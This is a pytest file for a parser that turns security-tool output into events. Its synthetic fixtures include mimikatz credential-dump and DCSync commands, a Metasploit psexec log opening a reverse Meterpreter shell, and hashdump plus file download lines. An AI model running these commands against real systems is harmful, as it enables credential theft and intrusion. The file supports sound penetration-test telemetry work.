"""
Tests for M1 — Tool Output Normalization Layer
invar/adapters/measurement/tool_normalizer.py

Architecture under test (Section 3, INVAR Research Paper v2.28):
    MeasurementEvent  — frozen canonical event (source/node_key/gate_id/...)
    ToolNormalizer    — instrument parser protocol
    NormalizerRegistry — first-match ordered dispatch
    MeasurementAdapter — orchestration + Pearl emission

All inputs are synthetic; no real tools are executed.
"""
from __future__ import annotations
import time
import pytest

from invar.adapters.measurement.tool_normalizer import (
    MeasurementAdapter,
    MeasurementEvent,
    NmapNormalizer,
    MimikatzNormalizer,
    Enum4linuxNormalizer,
    PowerUpNormalizer,
    NiktoNormalizer,
    MetasploitNormalizer,
    NormalizerRegistry,
    _raw_ref,
)
from invar.core.gate import GateState
from invar.persistence.pearl_archive import PearlArchive


# ===========================================================================
# Shared context helper
# ===========================================================================

def _ctx(
    workload_id: str = "eng-01",
    node_key: str = "192.168.1.50",
    cycle_id: str = "cycle-01",
    timestamp: float = 1_000_000.0,
) -> dict:
    return {
        "workload_id": workload_id,
        "node_key": node_key,
        "cycle_id": cycle_id,
        "timestamp": timestamp,
    }


# ===========================================================================
# Fixtures — synthetic tool output strings
# ===========================================================================

NMAP_XML_BASIC = """<?xml version="1.0"?>
<nmaprun>
  <host>
    <status state="up"/>
    <address addr="192.168.1.50" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="445">
        <state state="open"/>
        <service name="microsoft-ds"/>
      </port>
      <port protocol="tcp" portid="80">
        <state state="open"/>
        <service name="http"/>
      </port>
      <port protocol="tcp" portid="22">
        <state state="open"/>
        <service name="ssh"/>
      </port>
    </ports>
    <os>
      <osmatch name="Windows 11 21H2" accuracy="96"/>
    </os>
  </host>
</nmaprun>"""

NMAP_XML_CLOSED = """<?xml version="1.0"?>
<nmaprun>
  <host>
    <status state="down"/>
    <address addr="10.0.0.1" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="80">
        <state state="closed"/>
      </port>
    </ports>
  </host>
</nmaprun>"""

NMAP_XML_MULTI_HOST = """<?xml version="1.0"?>
<nmaprun>
  <host>
    <status state="up"/>
    <address addr="10.0.0.1" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="443"><state state="open"/></port>
    </ports>
  </host>
  <host>
    <status state="up"/>
    <address addr="10.0.0.2" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="3389"><state state="open"/></port>
    </ports>
  </host>
</nmaprun>"""

MIMIKATZ_SEKURLSA = """\
  .#####.   mimikatz 2.2.0 (x64)
  .## ^ ##.
  ## / \\ ##  mimikatz # sekurlsa::logonpasswords
  ## \\ / ##
  '## v ##'
  '#####'

Authentication Id : 0 ; 12345 (00000000:00003039)
Session           : Interactive from 1
User Name         : jsmith
Domain            : CORP
Logon Server      : DC01
Logon Time        : 4/22/2026 10:00:00 AM
SID               : S-1-5-21-...

         * Username : jsmith
         * Domain   : CORP
         * NTLM     : aad3b435b51404eeaad3b435b51404ee
         * SHA1     : ...
        wdigest :
         * Username : jsmith
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jsmith
         * Domain   : CORP.LOCAL
         * Password : (null)"""

MIMIKATZ_DCSYNC = """\
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
Object RDN           : Administrator
** SAM ACCOUNT **
SAM Username         : Administrator
Object Security ID   : S-1-5-21-...-500
Object Relative ID   : 500
Credentials:
  Hash NTLM: aad3b435b51404eeaad3b435b51404ee"""

ENUM4LINUX_OUTPUT = """\
Starting enum4linux v0.9.1
 ==========================
|    Target Information    |
 ==========================
Target ........... 192.168.1.50
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''

 =============================
|    Share Enumeration on 192.168.1.50    |
 =============================
\tSharename       Type      Comment
\t---------       ----      -------
\tADMIN$          Disk      Remote Admin
\tC$              Disk      Default share
\tIPC$            IPC       Remote IPC
\tUsers           Disk

 ======================================
|    Users on 192.168.1.50 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================
[I] Found new SID: S-1-5-21-...
[I] Found new SID: S-1-5-21-...
S-1-5-21-...-500 CORP\\Administrator (Local User)
S-1-5-21-...-1001 CORP\\jsmith (Local User)

 ========================
|    Groups on 192.168.1.50    |
 ========================
Group: Administrators
  BUILTIN\\Administrators (Local Group)"""

POWERUP_OUTPUT = """\
Invoke-AllChecks

[*] Running Invoke-AllChecks

[*] Checking for unquoted service paths...
[+] Unquoted Service Path: C:\\Program Files\\Vulnerable App\\service.exe
    Name        : VulnSvc
    Path        : C:\\Program Files\\Vulnerable App\\service.exe
    ModifiablePath: C:\\Program Files\\Vulnerable App
    AbuseFunction: Write-ServiceBinary -Name 'VulnSvc' -Path <HijackPath>

[*] Checking for modifiable service files...
[+] ModifiableServiceFile: C:\\Windows\\temp\\svc.exe
    Name: WeakSvc
    AbuseFunction: Install-ServiceBinary -Name 'WeakSvc'

[*] Checking HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run...
[+] Found autorun: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor

[*] Checking for DLL hijacking opportunities...
[+] HijackableDLL: C:\\Program Files\\App\\missing.dll
    AbuseFunction: Write-HijackDll -DllPath <path>"""

NIKTO_OUTPUT = """\
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.50
+ Target Hostname:    target.corp.local
+ Target Port:        80
+ Start Time:         2026-04-22 10:00:00 (GMT0)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ OSVDB-3233: /iisstart.htm: Default IIS page found
+ OSVDB-630: IIS default files found. See: http://...
+ /backup/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ Cookie ASP.NET_SessionId created without the httponly flag
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST"""

MSF_PSEXEC = """\
[*] Started reverse TCP handler on 10.10.10.1:4444
[*] Connecting to the server...
[*] Authenticating to 192.168.1.50:445 as user 'Administrator'...
[*] Selecting PowerShell target
[*] Executing the payload...
[+] 192.168.1.50:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200774 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (10.10.10.1:4444 -> 192.168.1.50:49712)
msf exploit(psexec) > sessions -l"""

MSF_HASHDUMP = """\
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 192.168.1.50 - Collecting local exploits for x86/windows...
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > download C:\\\\Users\\\\Administrator\\\\Documents\\\\secret.txt"""


# ===========================================================================
# MeasurementEvent schema
# ===========================================================================

class TestMeasurementEvent:

    def test_frozen(self):
        ev = MeasurementEvent(
            timestamp=1.0, source="nmap", node_key="host",
            workload_id="w1", cycle_id="c1", gate_id="discover_nmap_host", raw_ref=None,
        )
        with pytest.raises((AttributeError, TypeError)):
            ev.gate_id = "something_else"  # type: ignore[misc]

    def test_field_names(self):
        ev = MeasurementEvent(
            timestamp=1_000_000.0, source="mimikatz", node_key="DC01",
            workload_id="eng-01", cycle_id="cycle-03", gate_id="cred_mimikatz_logonpw",
            raw_ref="abc123",
        )
        assert ev.timestamp == 1_000_000.0
        assert ev.source == "mimikatz"
        assert ev.node_key == "DC01"
        assert ev.workload_id == "eng-01"
        assert ev.cycle_id == "cycle-03"
        assert ev.gate_id == "cred_mimikatz_logonpw"
        assert ev.raw_ref == "abc123"

    def test_raw_ref_hash(self):
        ref = _raw_ref("some fragment")
        assert len(ref) == 16
        assert ref == _raw_ref("some fragment")  # deterministic

    def test_raw_ref_different_inputs(self):
        assert _raw_ref("abc") != _raw_ref("xyz")

    def test_raw_ref_none_allowed(self):
        ev = MeasurementEvent(
            timestamp=1.0, source="nmap", node_key="h",
            workload_id="w", cycle_id="c", gate_id="discover_nmap_host", raw_ref=None,
        )
        assert ev.raw_ref is None


# ===========================================================================
# NmapNormalizer
# ===========================================================================

class TestNmapNormalizer:

    def _parse(self, xml: str, **ctx_kwargs) -> list:
        ctx = _ctx(**ctx_kwargs)
        return NmapNormalizer().parse(xml, ctx)

    def test_host_up(self):
        events = self._parse(NMAP_XML_BASIC)
        assert any(e.gate_id == "discover_nmap_host" for e in events)

    def test_smb_port_445(self):
        events = self._parse(NMAP_XML_BASIC)
        gate_ids = [e.gate_id for e in events]
        # port 445 maps to discover_nmap_445 — NOT discover_nmap_smb (lateral collision avoidance)
        assert "discover_nmap_445" in gate_ids
        assert "discover_nmap_smb" not in gate_ids

    def test_http_port(self):
        events = self._parse(NMAP_XML_BASIC)
        assert any(e.gate_id == "discover_nmap_http" for e in events)

    def test_ssh_port(self):
        events = self._parse(NMAP_XML_BASIC)
        assert any(e.gate_id == "discover_nmap_ssh" for e in events)

    def test_os_detection(self):
        events = self._parse(NMAP_XML_BASIC)
        assert any(e.gate_id == "discover_nmap_os" for e in events)

    def test_node_key_from_xml(self):
        events = self._parse(NMAP_XML_BASIC, node_key="fallback-host")
        # nmap reads the actual IP from XML, overriding context fallback
        for e in events:
            assert e.node_key == "192.168.1.50"

    def test_closed_host_no_events(self):
        assert self._parse(NMAP_XML_CLOSED) == []

    def test_multi_host_both_ips(self):
        events = self._parse(NMAP_XML_MULTI_HOST)
        ips = {e.node_key for e in events}
        assert "10.0.0.1" in ips
        assert "10.0.0.2" in ips

    def test_rdp_port(self):
        events = self._parse(NMAP_XML_MULTI_HOST)
        assert any(e.gate_id == "discover_nmap_rdp" for e in events)

    def test_https_port(self):
        events = self._parse(NMAP_XML_MULTI_HOST)
        assert any(e.gate_id == "discover_nmap_https" for e in events)

    def test_malformed_xml(self):
        assert self._parse("<not valid<<<") == []

    def test_source_field(self):
        events = self._parse(NMAP_XML_BASIC)
        assert all(e.source == "nmap" for e in events)

    def test_deterministic(self):
        ctx = _ctx(timestamp=1_000_000.0)
        n = NmapNormalizer()
        assert n.parse(NMAP_XML_BASIC, ctx) == n.parse(NMAP_XML_BASIC, ctx)

    def test_raw_ref_present(self):
        events = self._parse(NMAP_XML_BASIC)
        for e in events:
            assert e.raw_ref is not None
            assert len(e.raw_ref) == 16

    def test_workload_and_cycle_propagated(self):
        ctx = _ctx(workload_id="eng-99", cycle_id="recon-01")
        events = NmapNormalizer().parse(NMAP_XML_BASIC, ctx)
        for e in events:
            assert e.workload_id == "eng-99"
            assert e.cycle_id == "recon-01"

    def test_all_gate_ids_discover_prefix(self):
        events = self._parse(NMAP_XML_BASIC)
        assert all(e.gate_id.startswith("discover_") for e in events)


# ===========================================================================
# MimikatzNormalizer
# ===========================================================================

class TestMimikatzNormalizer:

    def _parse(self, text: str, **ctx_kwargs) -> list:
        ctx = _ctx(**ctx_kwargs)
        return MimikatzNormalizer().parse(text, ctx)

    def test_logonpasswords(self):
        events = self._parse(MIMIKATZ_SEKURLSA)
        assert any(e.gate_id == "cred_mimikatz_logonpw" for e in events)

    def test_ntlm_hash(self):
        events = self._parse(MIMIKATZ_SEKURLSA)
        assert any(e.gate_id == "cred_hash_ntlm" for e in events)

    def test_dcsync(self):
        events = self._parse(MIMIKATZ_DCSYNC, node_key="DC01")
        assert any(e.gate_id == "cred_mimikatz_dcsync" for e in events)

    def test_dcsync_ntlm(self):
        events = self._parse(MIMIKATZ_DCSYNC, node_key="DC01")
        assert any(e.gate_id == "cred_hash_ntlm" for e in events)

    def test_deduplication_same_gate_same_node(self):
        doubled = MIMIKATZ_DCSYNC + "\n" + MIMIKATZ_DCSYNC
        events = self._parse(doubled, node_key="DC01")
        assert [e.gate_id for e in events].count("cred_mimikatz_dcsync") == 1

    def test_node_key_from_context(self):
        events = self._parse(MIMIKATZ_SEKURLSA, node_key="WORKSTATION1")
        assert all(e.node_key == "WORKSTATION1" for e in events)

    def test_empty_text(self):
        assert self._parse("") == []

    def test_source_field(self):
        events = self._parse(MIMIKATZ_SEKURLSA)
        assert all(e.source == "mimikatz" for e in events)

    def test_deterministic(self):
        ctx = _ctx(timestamp=1_000_000.0)
        n = MimikatzNormalizer()
        assert n.parse(MIMIKATZ_SEKURLSA, ctx) == n.parse(MIMIKATZ_SEKURLSA, ctx)

    def test_all_gate_ids_cred_prefix(self):
        events = self._parse(MIMIKATZ_SEKURLSA)
        assert all(e.gate_id.startswith("cred_") for e in events)


# ===========================================================================
# Enum4linuxNormalizer
# ===========================================================================

class TestEnum4linuxNormalizer:

    def _parse(self, text: str, **ctx_kwargs) -> list:
        ctx = _ctx(**ctx_kwargs)
        return Enum4linuxNormalizer().parse(text, ctx)

    def test_shares(self):
        events = self._parse(ENUM4LINUX_OUTPUT)
        assert any(e.gate_id == "discover_shares" for e in events)

    def test_no_smb_collision(self):
        events = self._parse(ENUM4LINUX_OUTPUT)
        gate_ids = [e.gate_id for e in events]
        # old gate_ids with "smb" substring must not appear
        assert "discover_smb_shares" not in gate_ids
        assert "discover_smb_users" not in gate_ids
        assert "discover_smb_groups" not in gate_ids

    def test_users(self):
        events = self._parse(ENUM4LINUX_OUTPUT)
        assert any(e.gate_id == "discover_users" for e in events)

    def test_groups(self):
        events = self._parse(ENUM4LINUX_OUTPUT)
        assert any(e.gate_id == "discover_groups" for e in events)

    def test_deduplication(self):
        events = self._parse(ENUM4LINUX_OUTPUT)
        assert [e.gate_id for e in events].count("discover_shares") == 1

    def test_source_field(self):
        events = self._parse(ENUM4LINUX_OUTPUT)
        assert all(e.source == "enum4linux" for e in events)

    def test_empty_text(self):
        assert self._parse("") == []

    def test_deterministic(self):
        ctx = _ctx(timestamp=1_000_000.0)
        n = Enum4linuxNormalizer()
        assert n.parse(ENUM4LINUX_OUTPUT, ctx) == n.parse(ENUM4LINUX_OUTPUT, ctx)

    def test_all_gate_ids_discover_prefix(self):
        events = self._parse(ENUM4LINUX_OUTPUT)
        assert all(e.gate_id.startswith("discover_") for e in events)


# ===========================================================================
# PowerUpNormalizer
# ===========================================================================

class TestPowerUpNormalizer:

    def _parse(self, text: str, **ctx_kwargs) -> list:
        ctx = _ctx(**ctx_kwargs)
        return PowerUpNormalizer().parse(text, ctx)

    def test_unquoted_service(self):
        events = self._parse(POWERUP_OUTPUT)
        assert any(e.gate_id == "persist_svc_unquoted" for e in events)

    def test_modifiable_service(self):
        events = self._parse(POWERUP_OUTPUT)
        assert any(e.gate_id == "persist_svc_modifiable" for e in events)

    def test_autorun(self):
        events = self._parse(POWERUP_OUTPUT)
        assert any(e.gate_id == "persist_autorun" for e in events)

    def test_dll_hijack(self):
        events = self._parse(POWERUP_OUTPUT)
        assert any(e.gate_id == "persist_dll_hijack" for e in events)

    def test_checks(self):
        events = self._parse(POWERUP_OUTPUT)
        assert any(e.gate_id == "persist_checks" for e in events)

    def test_deduplication(self):
        doubled = POWERUP_OUTPUT + "\n" + POWERUP_OUTPUT
        events = self._parse(doubled)
        assert [e.gate_id for e in events].count("persist_svc_unquoted") == 1

    def test_source_field(self):
        events = self._parse(POWERUP_OUTPUT)
        assert all(e.source == "powerup" for e in events)

    def test_powershell_alias(self):
        ctx = _ctx()
        n = PowerUpNormalizer()
        assert n.supports("powershell")
        assert n.supports("powerup")

    def test_empty_text(self):
        assert self._parse("") == []

    def test_deterministic(self):
        ctx = _ctx(timestamp=1_000_000.0)
        n = PowerUpNormalizer()
        assert n.parse(POWERUP_OUTPUT, ctx) == n.parse(POWERUP_OUTPUT, ctx)

    def test_all_gate_ids_persist_prefix(self):
        events = self._parse(POWERUP_OUTPUT)
        assert all(e.gate_id.startswith("persist_") for e in events)


# ===========================================================================
# NiktoNormalizer
# ===========================================================================

class TestNiktoNormalizer:

    def _parse(self, text: str, **ctx_kwargs) -> list:
        ctx = _ctx(**ctx_kwargs)
        return NiktoNormalizer().parse(text, ctx)

    def test_vuln(self):
        events = self._parse(NIKTO_OUTPUT)
        assert any(e.gate_id == "discover_nikto_vuln" for e in events)

    def test_server(self):
        events = self._parse(NIKTO_OUTPUT)
        assert any(e.gate_id == "discover_web_server" for e in events)

    def test_web_dir(self):
        events = self._parse(NIKTO_OUTPUT)
        assert any(e.gate_id == "discover_web_dir" for e in events)

    def test_source_field(self):
        events = self._parse(NIKTO_OUTPUT)
        assert all(e.source == "nikto" for e in events)

    def test_empty_text(self):
        assert self._parse("") == []

    def test_deterministic(self):
        ctx = _ctx(timestamp=1_000_000.0)
        n = NiktoNormalizer()
        assert n.parse(NIKTO_OUTPUT, ctx) == n.parse(NIKTO_OUTPUT, ctx)

    def test_all_gate_ids_discover_prefix(self):
        events = self._parse(NIKTO_OUTPUT)
        assert all(e.gate_id.startswith("discover_") for e in events)


# ===========================================================================
# MetasploitNormalizer
# ===========================================================================

class TestMetasploitNormalizer:

    def _parse(self, text: str, **ctx_kwargs) -> list:
        ctx = _ctx(**ctx_kwargs)
        return MetasploitNormalizer().parse(text, ctx)

    def test_psexec_lateral(self):
        events = self._parse(MSF_PSEXEC)
        assert any(e.gate_id == "lateral_msf_psexec" for e in events)

    def test_meterpreter_session(self):
        events = self._parse(MSF_PSEXEC)
        assert any(e.gate_id == "exec_msf_session" for e in events)

    def test_hashdump_cred(self):
        events = self._parse(MSF_HASHDUMP)
        assert any(e.gate_id == "cred_msf_capture" for e in events)

    def test_post_module(self):
        events = self._parse(MSF_HASHDUMP)
        assert any(e.gate_id == "exec_msf_module" for e in events)

    def test_download_loot(self):
        events = self._parse(MSF_HASHDUMP)
        assert any(e.gate_id == "collect_msf_loot" for e in events)

    def test_source_field(self):
        events = self._parse(MSF_PSEXEC)
        assert all(e.source == "msf" for e in events)

    def test_metasploit_alias(self):
        n = MetasploitNormalizer()
        assert n.supports("msf")
        assert n.supports("metasploit")

    def test_empty_text(self):
        assert self._parse("") == []

    def test_deduplication(self):
        doubled = MSF_PSEXEC + "\n" + MSF_PSEXEC
        events = self._parse(doubled)
        assert [e.gate_id for e in events].count("lateral_msf_psexec") == 1

    def test_deterministic(self):
        ctx = _ctx(timestamp=1_000_000.0)
        n = MetasploitNormalizer()
        assert n.parse(MSF_PSEXEC, ctx) == n.parse(MSF_PSEXEC, ctx)


# ===========================================================================
# NormalizerRegistry
# ===========================================================================

class TestNormalizerRegistry:

    def test_default_registers_all_six(self):
        reg = NormalizerRegistry.default()
        sources = ["nmap", "mimikatz", "enum4linux", "powerup", "nikto", "msf"]
        ctx = _ctx()
        for src in sources:
            # just verify dispatch doesn't raise and returns a list
            result = reg.parse(src, "", ctx)
            assert isinstance(result, list)

    def test_unknown_source_returns_empty(self):
        reg = NormalizerRegistry.default()
        result = reg.parse("unknown_tool_xyz", "some output", _ctx())
        assert result == []

    def test_first_match_dispatch_nmap(self):
        reg = NormalizerRegistry.default()
        events = reg.parse("nmap", NMAP_XML_BASIC, _ctx())
        assert any(e.gate_id == "discover_nmap_host" for e in events)

    def test_first_match_dispatch_mimikatz(self):
        reg = NormalizerRegistry.default()
        events = reg.parse("mimikatz", MIMIKATZ_SEKURLSA, _ctx())
        assert any(e.gate_id == "cred_mimikatz_logonpw" for e in events)

    def test_first_match_dispatch_msf(self):
        reg = NormalizerRegistry.default()
        events = reg.parse("msf", MSF_PSEXEC, _ctx())
        assert any(e.gate_id == "lateral_msf_psexec" for e in events)

    def test_metasploit_alias_dispatch(self):
        reg = NormalizerRegistry.default()
        events = reg.parse("metasploit", MSF_PSEXEC, _ctx())
        assert any(e.gate_id == "lateral_msf_psexec" for e in events)

    def test_powershell_alias_dispatch(self):
        reg = NormalizerRegistry.default()
        events = reg.parse("powershell", POWERUP_OUTPUT, _ctx())
        assert any(e.gate_id.startswith("persist_") for e in events)

    def test_normalizer_exception_returns_empty(self):
        """Registry swallows exceptions from normalizers."""
        class BrokenNormalizer:
            def supports(self, source): return source == "broken"
            def parse(self, raw, ctx): raise RuntimeError("kaboom")
        reg = NormalizerRegistry()
        reg._normalizers.append(BrokenNormalizer())
        assert reg.parse("broken", "any", _ctx()) == []

    def test_register_custom_normalizer(self):
        from invar.adapters.measurement.tool_normalizer import ToolNormalizer

        class AlwaysOneNormalizer(ToolNormalizer):
            def source_name(self): return "custom"
            def supports(self, source): return source == "custom"
            def parse(self, raw, ctx):
                return [self._event("discover_custom_test", ctx, "frag")]

        reg = NormalizerRegistry()
        reg.register(AlwaysOneNormalizer())
        events = reg.parse("custom", "anything", _ctx())
        assert len(events) == 1
        assert events[0].gate_id == "discover_custom_test"

    def test_returns_list_not_exception_on_empty_source(self):
        reg = NormalizerRegistry.default()
        result = reg.parse("nmap", "", _ctx())
        assert isinstance(result, list)


# ===========================================================================
# MeasurementAdapter integration
# ===========================================================================

class TestMeasurementAdapter:

    def test_ingest_nmap_returns_pearls(self):
        adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
        pearls = adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
        assert len(pearls) > 0
        assert all(p.gate_id.startswith("discover_") for p in pearls)

    def test_ingest_mimikatz_cred_pearls(self):
        adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c03")
        assert any("cred_" in p.gate_id for p in pearls)

    def test_ingest_enum4linux_discover_shares(self):
        adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
        pearls = adapter.ingest_enum4linux(ENUM4LINUX_OUTPUT, cycle_id="c02")
        gate_ids = [p.gate_id for p in pearls]
        assert "discover_shares" in gate_ids
        assert "discover_smb_shares" not in gate_ids

    def test_ingest_powerup_pearls(self):
        adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
        pearls = adapter.ingest_powerup(POWERUP_OUTPUT, cycle_id="c04")
        assert any("persist_" in p.gate_id for p in pearls)

    def test_ingest_nikto_pearls(self):
        adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
        pearls = adapter.ingest_nikto(NIKTO_OUTPUT, cycle_id="c05")
        assert any(p.gate_id == "discover_nikto_vuln" for p in pearls)

    def test_ingest_msf_pearls(self):
        adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
        pearls = adapter.ingest_msf(MSF_PSEXEC, cycle_id="c06")
        assert any(p.gate_id == "lateral_msf_psexec" for p in pearls)

    def test_pearl_fields_correct(self):
        adapter = MeasurementAdapter("eng-42", node_key="HP-WIN11")
        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="recon-01")
        p = pearls[0]
        assert p.workload_id == "eng-42"
        assert p.node_key == "HP-WIN11"
        assert p.cycle_id == "recon-01"
        assert p.state_before == GateState.U
        assert p.state_after == GateState.R
        assert p.phi_R_after == pytest.approx(1.0)
        assert p.H_after == pytest.approx(1.0)

    def test_instrument_id_contains_tool(self):
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        pearls = adapter.ingest_mimikatz(MIMIKATZ_DCSYNC, cycle_id="c03")
        assert all("mimikatz" in p.instrument_id for p in pearls)

    def test_instrument_id_nmap(self):
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        pearls = adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
        assert all("nmap" in p.instrument_id for p in pearls)

    def test_seq_id_monotone_across_tools(self):
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        p1 = adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
        p2 = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c03")
        all_seqs = [p.seq_id for p in p1 + p2]
        assert all_seqs == sorted(all_seqs)
        assert len(set(all_seqs)) == len(all_seqs)

    def test_pearls_accumulate(self):
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
        adapter.ingest_mimikatz(MIMIKATZ_DCSYNC, cycle_id="c03")
        assert len(adapter.pearls()) > 1

    def test_snapshot(self):
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
        archive, pl = adapter.snapshot()
        assert isinstance(archive, PearlArchive)
        assert len(pl) == len(adapter.pearls())
        assert len(archive.pearls) == len(pl)

    def test_cycle_override(self):
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="operator-recon")
        assert all(p.cycle_id == "operator-recon" for p in pearls)

    def test_auto_cycle_discovery(self):
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        pearls = adapter.ingest_nmap(NMAP_XML_BASIC)
        assert len(pearls) > 0
        assert pearls[0].cycle_id.startswith("auto_")

    def test_node_key_from_adapter_non_nmap(self):
        """For non-nmap tools, adapter node_key flows through to pearls."""
        adapter = MeasurementAdapter("eng-01", node_key="FIXED-HOST")
        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c01")
        assert all(p.node_key == "FIXED-HOST" for p in pearls)

    def test_target_override_non_nmap(self):
        adapter = MeasurementAdapter("eng-01", node_key="DEFAULT-HOST")
        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c01", target="OVERRIDE-HOST")
        assert all(p.node_key == "OVERRIDE-HOST" for p in pearls)

    def test_no_layer0_effect(self):
        from invar.core.support_engine import SupportEngine
        substrate = SupportEngine()
        t = time.time()
        energy_before = substrate.field_energy(t)
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
        adapter.ingest_mimikatz(MIMIKATZ_DCSYNC, cycle_id="c03")
        adapter.ingest_powerup(POWERUP_OUTPUT, cycle_id="c04")
        assert substrate.field_energy(t) == pytest.approx(energy_before, abs=1e-12)

    def test_deterministic(self):
        def run():
            a = MeasurementAdapter("eng-01", node_key="HOST")
            a.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c03")
            return [(p.gate_id, p.cycle_id) for p in a.pearls()]
        assert run() == run()

    def test_ingest_generic_api(self):
        """adapter.ingest(source, raw) is the primary entry point."""
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        pearls = adapter.ingest("mimikatz", MIMIKATZ_DCSYNC, cycle_id="c03")
        assert len(pearls) > 0

    def test_unknown_source_returns_empty(self):
        adapter = MeasurementAdapter("eng-01", node_key="HOST")
        pearls = adapter.ingest("unknown_tool_xyz", "garbage output", cycle_id="c01")
        assert pearls == []

    def test_custom_registry(self):
        from invar.adapters.measurement.tool_normalizer import ToolNormalizer

        class OneEventNormalizer(ToolNormalizer):
            def source_name(self): return "mytool"
            def supports(self, source): return source == "mytool"
            def parse(self, raw, ctx):
                return [self._event("discover_custom_gate", ctx, "frag")]

        reg = NormalizerRegistry()
        reg.register(OneEventNormalizer())
        adapter = MeasurementAdapter("eng-01", node_key="HOST", registry=reg)
        pearls = adapter.ingest("mytool", "anything", cycle_id="c01")
        assert len(pearls) == 1
        assert pearls[0].gate_id == "discover_custom_gate"
